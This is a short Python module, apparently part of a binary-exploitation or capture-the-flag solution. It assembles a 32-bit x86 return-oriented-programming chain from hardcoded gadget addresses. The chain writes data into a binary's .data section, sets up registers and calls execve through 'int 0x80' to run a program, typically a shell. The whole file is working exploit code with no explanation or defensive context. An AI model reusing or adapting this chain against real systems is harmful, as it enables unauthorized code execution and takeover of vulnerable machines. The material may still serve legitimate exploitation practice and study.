from struct import pack


def push_bytes(data, address):
    p = b''
    p += pack('<I', 0x0806e13b) # pop edx ; ret
    p += pack('<I', address) # @ .data
    p += pack('<I', 0x080a8cb6) # pop eax ; ret
    p += data
    p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret
    return p


def push_ptr(ptr, address):
    p = b''
    p += pack('<I', 0x0806e13b) # pop edx ; ret
    p += pack('<I', address) # @ .data
    p += pack('<I', 0x080a8cb6) # pop eax ; ret
    p += pack('<I', ptr) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret
    return p


def push_null(address):
    p = b''
    p += pack('<I', 0x0806e13b) # pop edx ; ret
    p += pack('<I', address) # @ .data + 8
    p += pack('<I', 0x08056190) # xor eax, eax ; ret
    p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret
    return p


def execve_syscall(argv_ptr, envp_ptr):
    p = b''
    p += pack('<I', 0x080481c9) # pop ebx ; ret
    p += pack('<I', 0x080da060) # @ .data
    p += pack('<I', 0x0806e162) # pop ecx ; pop ebx ; ret
    p += pack('<I', argv_ptr) # @ .data + 8
    p += pack('<I', 0x080da060) # padding without overwrite ebx
    p += pack('<I', 0x0806e13b) # pop edx ; ret
    p += pack('<I', envp_ptr) # @ .data + 8
    p += pack('<I', 0x08056190) # xor eax, eax ; ret
    p += pack('<I', 0x0807ba0a) # inc eax ; ret
    p += pack('<I', 0x0807ba0a) # inc eax ; ret
    p += pack('<I', 0x0807ba0a) # inc eax ; ret
    p += pack('<I', 0x0807ba0a) # inc eax ; ret
    p += pack('<I', 0x0807ba0a) # inc eax ; ret
    p += pack('<I', 0x0807ba0a) # inc eax ; ret
    p += pack('<I', 0x0807ba0a) # inc eax ; ret
    p += pack('<I', 0x0807ba0a) # inc eax ; ret
    p += pack('<I', 0x0807ba0a) # inc eax ; ret
    p += pack('<I', 0x0807ba0a) # inc eax ; ret
    p += pack('<I', 0x0807ba0a) # inc eax ; ret
    p += pack('<I', 0x080495f3) # int 0x80
    return p
